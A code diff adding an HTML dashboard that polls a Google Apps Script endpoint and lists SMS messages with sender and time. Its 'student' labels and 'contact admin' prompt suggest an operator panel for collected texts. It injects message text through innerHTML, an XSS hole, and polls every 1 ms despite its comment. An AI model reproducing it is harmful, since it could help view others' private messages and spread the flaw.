@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Firebase Data as a List</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            display: flex;
+        }
+
+        /* Top bar */
+        .top-bar {
+            background-color: black;
+            color: white;
+            padding: 15px;
+            text-align: left;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 80px;
+            background-color: black;
+            color: white;
+            position: fixed;
+            top: 60px;
+            left: 0;
+            height: calc(100% - 60px);
+            padding: 15px;
+            box-sizing: border-box;
+            transition: left 0.3s ease;
+            z-index: 100;
+            overflow-y: auto;
+        }
+
+        .sidebar.hidden {
+            left: -80px;
+        }
+
+        .sidebar a {
+            color: white;
+            display: flex;
+            align-items: center;
+            padding: 10px 0;
+            text-decoration: none;
+        }
+
+        .sidebar img {
+            width: 20px;
+            height: 20px;
+            margin-bottom: 12px;
+        }
+
+        .sidebar a:hover {
+            background-color: #575757;
+        }
+
+        /* Content container */
+        .content-container {
+            margin: 60px 0;
+            margin-left: 80px;
+            flex-grow: 1;
+            transition: margin-left 0.3s ease;
+            padding: 10px;
+        }
+
+        .content-container.shifted {
+            margin-left: 80px;
+        }
+
+        #clearAllDataButton1 {
+            margin: 15px auto;
+            background-color: rgb(5, 177, 19);
+            color: rgb(17, 17, 17);
+            border: 2px solid white;
+            border-radius: 5px;
+            padding: 5px 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .student-container {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            margin-bottom: 10px;
+            max-width: 100%;
+        }
+
+        .student-box-yellow,
+        .student-box-red {
+            padding: 10px;
+            border: 2px solid rgb(13, 4, 133);
+            border-radius: 5px;
+            cursor: text;
+            max-width: 65%;
+            color: white;
+            background-color: black;
+            word-wrap: break-word;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+
+        .serial-number {
+            font-weight: bold;
+            margin-right: 15px;
+            font-size: 18px;
+        }
+
+     
+        .menu-link {
+    display: block;
+    padding: 10px 0;
+    text-align: center;
+    color: white;
+    text-decoration: none;
+    border-top: 1px solid white; /* Adds the bar above */
+    margin-top: 20px; /* Optional: adds space between the previous item */
+}
+
+.menu-link:hover {
+    background-color: #575757; /* Hover effect */
+}
+
+
+        
+
+        /* Media queries */
+        @media (max-width: 600px) {
+            .student-box-yellow,
+            .student-box-red {
+                padding: 8px;
+                font-size: calc(12px + 1vw);
+            }
+
+            .serial-number {
+                font-size: calc(12px + 1vw);
+                margin-right: 10px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <span>
+            <img src="image/logo.jpeg" alt="" style="width: 50px; height: 50px; vertical-align: middle; margin-right: 8px;">
+        </span>
+        <span id="menuIcon" class="menu-icon" style="margin-left: 10px;">&#9776;</span>
+        <span style="margin-left: 10px;"></span>
+    </div>
+
+    <!-- Sidebar -->
+    <div id="sidebar" class="sidebar">
+        <a href="widget.html">
+            <img src="image/widget.png" alt="number change">
+        </a>
+        <a href="numberchange.html">
+            <img src="image/setting.png" alt="Message Icon">
+        </a>
+        <a href="details.html">
+            <img src="image/msgsms.png" alt="Telegram Icon">
+        </a>
+        <a href="message.html">
+            <img src="image/msgsms.png" alt="Telegram Icon">
+        </a>
+        <a href="index.html">
+            <img src="image/exit1.png" alt="Exit Icon">
+        </a>
+        <a href="https://wa.me/8240338785">
+            <img src="image/wp.png" alt="WhatsApp Icon">
+        </a>
+        <a href="#"><img src="image/tele1.png" alt="count"></a>
+        <a href="#" class="menu-link">
+            Menu
+        </a>
+        
+
+        <a href="#" id="clearAllDataButton">
+            <img src="image/clear.jpeg" alt="Telegram Icon">
+            </a> 
+
+        <a href="passwordchange.html">
+            <img src="image/arrow.png" alt="Exit Icon"> 
+        </a>
+
+        <a href="#">
+            <img src="image/down.png" alt="Exit Icon"> 
+        </a>
+
+
+    </div>
+
+    <!-- Content Container -->
+    <div id="content" class="content-container">
+        <button id="clearAllDataButton1">Clear All Data</button>
+        <div id="StudentDiv"></div>
+    </div>
+
+    <script type="module">
+        // URL of the deployed Google Apps Script Web App
+        const sheetApiUrl = "https://script.google.com/macros/s/AKfycbzGImirhOCXHX-El3u6rnHwo6PnKERycNy3v3VbnsmyemYT1m9uODGERTyjMZ07FV6K/exec"; // Replace with your Web App URL
+    
+        let StudentDiv = document.getElementById('StudentDiv');
+        let clearAllDataButton = document.getElementById('clearAllDataButton');
+    
+        function GetStudents() {
+    // Fetch SMS data from the Google Sheet (via the Web App URL)
+    fetch(sheetApiUrl)
+        .then(response => response.json())
+        .then(data => {
+            if (data.length > 0) {
+                StudentDiv.innerHTML = "";
+
+                // Use a Set to track unique message bodies
+                const uniqueMessages = new Set();
+
+                // Reverse the data array to show the latest messages first
+                data.reverse().forEach((smsData, index) => {
+                    if (!uniqueMessages.has(smsData.messageBody)) {
+                        uniqueMessages.add(smsData.messageBody); // Add unique message to the Set
+                        AddStudentAsListItem(smsData, uniqueMessages.size); // Use the size of the set as serial number
+                    }
+                });
+            } else {
+                console.log("No data available");
+            }
+        })
+        .catch(error => {
+            console.error("Error fetching data: ", error);
+        });
+}
+
+    
+        function AddStudentAsListItem(smsData, serialNumber) {
+            let messageBody = smsData.messageBody || 'Not available';
+            let receivedTime = smsData.receivedTime || 'Not available';
+            let sender = smsData.sender || 'Not available';
+    
+            let containerDiv = document.createElement('div');
+            containerDiv.className = 'student-container';
+    
+             // Serial number (left side)
+let serialNumberDiv = document.createElement('div');
+serialNumberDiv.className = 'serial-number';
+serialNumberDiv.textContent = ` ${"*"}`;
+serialNumberDiv.style.color = 'red'; // Set the text color to red
+
+            // Student data box
+            let div = document.createElement('div');
+            div.className = (serialNumber % 2 === 0) ? 'student-box-yellow' : 'student-box-red';
+    
+            let contentDiv = document.createElement('div');
+            contentDiv.innerHTML = `
+                <p>messageBody: ${messageBody}</p>
+                <p>receivedTime: ${receivedTime}</p>
+                <p>sender: ${sender}</p>
+            `;
+    
+            div.appendChild(contentDiv);
+    
+            // Append serial number (left) and data box (right) in the same row
+            containerDiv.appendChild(serialNumberDiv);
+            containerDiv.appendChild(div);
+    
+            StudentDiv.appendChild(containerDiv);
+        }
+    
+        clearAllDataButton.addEventListener('click', () => {
+            if (confirm("Contact with Admin for delete this data")) {
+                // Clear functionality, if necessary
+            }
+        });
+    
+        // Initial fetch of students (SMS data)
+        GetStudents();
+    
+        // Refresh data every 10 seconds (optional)
+        setInterval(() => {
+            GetStudents();
+        }, 1);
+    </script>
+    
